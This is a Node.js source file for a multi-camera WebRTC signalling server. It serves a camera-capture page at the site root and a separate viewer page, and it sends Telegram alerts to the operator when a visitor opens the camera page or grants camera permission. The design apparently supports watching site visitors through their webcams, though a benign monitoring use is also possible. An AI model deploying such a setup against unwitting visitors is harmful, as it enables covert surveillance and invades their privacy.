const http = require("http");
const fs = require("fs");
const path = require("path");
const https = require("https");
const WebSocket = require("ws");

const PORT = process.env.PORT || 10000;
const TELEGRAM_BOT_TOKEN =
  process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID =
  process.env.TELEGRAM_CHAT_ID || "";


function telegram(message) {

  if (
    !TELEGRAM_BOT_TOKEN ||
    !TELEGRAM_CHAT_ID
  ) {
    return;
  }

  const data = new URLSearchParams({
    chat_id: TELEGRAM_CHAT_ID,
    text: message
  }).toString();

  const req = https.request({

    hostname: "api.telegram.org",

    path:
      `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,

    method: "POST",

    headers: {

      "Content-Type":
        "application/x-www-form-urlencoded",

      "Content-Length":
        Buffer.byteLength(data)

    }

  });

  req.on("error", () => {});

  req.write(data);

  req.end();

}


function send(ws, message) {

  if (
    ws &&
    ws.readyState === WebSocket.OPEN
  ) {

    ws.send(
      JSON.stringify(message)
    );

  }

}


function makeId() {

  return (
    Math.random()
      .toString(36)
      .slice(2, 8)
    +
    Date.now()
      .toString(36)
      .slice(-4)
  );

}


const server = http.createServer(
  (req, res) => {

    const routes = {

      "/":
        "camera.html",

      "/camera":
        "camera.html",

      "/camera.html":
        "camera.html",

      "/viewer":
        "viewer.html",

      "/viewer.html":
        "viewer.html"

    };


    const pathname =
      new URL(
        req.url,
        `http://${req.headers.host || "localhost"}`
      ).pathname;


    const file =
      routes[pathname];


    if (!file) {

      res.writeHead(404);

      return res.end(
        "Not found"
      );

    }


    if (
      pathname === "/camera" ||
      pathname === "/camera.html"
    ) {

      telegram(
        "🔔 Someone opened the camera page.\n" +
        "Camera permission is still required."
      );

    }


    fs.readFile(
      path.join(
        __dirname,
        file
      ),
      (err, data) => {

        if (err) {

          res.writeHead(500);

          return res.end(
            "Server error"
          );

        }


        res.writeHead(
          200,
          {
            "Content-Type":
              "text/html; charset=utf-8"
          }
        );


        res.end(data);

      }
    );

  }
);


const wss =
  new WebSocket.Server({
    server
  });


const cameras =
  new Map();


const viewers =
  new Map();



wss.on(
  "connection",
  (ws, req) => {

    const pathname =
      new URL(
        req.url,
        "http://localhost"
      ).pathname;


    // Only accept these WebSocket paths

    if (
      pathname !== "/camera" &&
      pathname !== "/viewer"
    ) {

      ws.close();

      return;

    }


    const role =
      pathname === "/camera"
        ? "camera"
        : "viewer";


    // =========================
    // CAMERA
    // =========================

    if (
      role === "camera"
    ) {

      const cameraId =
        makeId();


      cameras.set(
        cameraId,
        ws
      );


      // Store whether the browser
      // has actually granted camera access

      ws.cameraLive =
        false;


      send(
        ws,
        {

          type: "role",

          role: "camera",

          cameraId

        }
      );


      // Tell current viewers
      // that the camera page exists

      for (
        const viewer
        of viewers.values()
      ) {

        send(
          viewer,
          {

            type:
              "camera-online",

            cameraId

          }
        );

      }


      telegram(
        `📷 Camera page connected.\n` +
        `Camera ID: ${cameraId}\n` +
        `The user must still allow camera access.`
      );


      ws.on(
        "message",
        raw => {

          let msg;


          try {

            msg =
              JSON.parse(
                raw.toString()
              );

          }

          catch {

            return;

          }


          // =========================
          // CAMERA IS NOW LIVE
          // =========================

          if (
            msg.type ===
            "camera-live"
          ) {

            // Prevent duplicate
            // live announcements

            const wasAlreadyLive =
              ws.cameraLive;


            ws.cameraLive =
              true;


            if (
              !wasAlreadyLive
            ) {

              telegram(
                `🟢 Camera permission was granted.\n` +
                `Camera ID: ${cameraId}`
              );

            }


            // Tell every viewer that
            // this camera now has a stream.
            // Then ask the camera to create
            // a fresh WebRTC offer for that viewer.

            for (
              const [
                viewerId,
                viewer
              ]
              of viewers.entries()
            ) {

              send(
                viewer,
                {

                  type:
                    "camera-live",

                  cameraId

                }
              );


              // CRITICAL FIX:
              // Camera permission may have
              // been granted after viewer-ready.
              // Trigger a new offer now.

              send(
                ws,
                {

                  type:
                    "viewer-ready",

                  viewerId

                }
              );

            }


            return;

          }


          // =========================
          // CAMERA -> VIEWER
          // Offer / ICE candidates
          // =========================

          if (
            msg.toViewerId
          ) {

            const viewer =
              viewers.get(
                msg.toViewerId
              );


            if (viewer) {

              send(
                viewer,
                {

                  ...msg,

                  cameraId

                }
              );

            }


            return;

          }

        }
      );


      ws.on(
        "close",
        () => {

          if (
            cameras.get(
              cameraId
            ) === ws
          ) {

            cameras.delete(
              cameraId
            );


            for (
              const viewer
              of viewers.values()
            ) {

              send(
                viewer,
                {

                  type:
                    "camera-offline",

                  cameraId

                }
              );

            }


            telegram(
              `🔴 Camera disconnected.\n` +
              `Camera ID: ${cameraId}`
            );

          }

        }
      );


      ws.on(
        "error",
        () => {}
      );


      return;

    }



    // =========================
    // VIEWER
    // =========================

    const viewerId =
      makeId();


    viewers.set(
      viewerId,
      ws
    );


    // Give viewer its ID
    // and current camera list

    send(
      ws,
      {

        type: "role",

        role: "viewer",

        viewerId,

        cameras:
          [
            ...cameras.keys()
          ]

      }
    );


    // Announce every existing
    // camera to the viewer

    for (
      const [
        cameraId,
        camera
      ]
      of cameras.entries()
    ) {

      send(
        ws,
        {

          type:
            "camera-online",

          cameraId

        }
      );


      // If camera permission was
      // already granted, notify
      // the viewer that it is live

      if (
        camera.cameraLive
      ) {

        send(
          ws,
          {

            type:
              "camera-live",

            cameraId

          }
        );

      }

    }


    ws.on(
      "message",
      raw => {

        let msg;


        try {

          msg =
            JSON.parse(
              raw.toString()
            );

        }

        catch {

          return;

        }


        // =========================
        // VIEWER WANTS CAMERA VIDEO
        // =========================

        if (
          msg.type ===
          "viewer-ready" &&
          msg.cameraId
        ) {

          const camera =
            cameras.get(
              msg.cameraId
            );


          if (camera) {

            // Send viewer ID to camera.
            // Camera page will create
            // an offer if the stream exists.

            send(
              camera,
              {

                type:
                  "viewer-ready",

                viewerId

              }
            );

          }


          return;

        }


        // =========================
        // VIEWER -> CAMERA
        // Answer / ICE candidates
        // =========================

        if (
          msg.cameraId
        ) {

          const camera =
            cameras.get(
              msg.cameraId
            );


          if (camera) {

            send(
              camera,
              {

                ...msg,

                toViewerId:
                  viewerId

              }
            );

          }


          return;

        }

      }
    );


    ws.on(
      "close",
      () => {

        viewers.delete(
          viewerId
        );

      }
    );


    ws.on(
      "error",
      () => {}
    );

  }
);


server.listen(
  PORT,
  "0.0.0.0",
  () => {

    console.log(
      `Multi-camera server running on port ${PORT}`
    );

  }
);
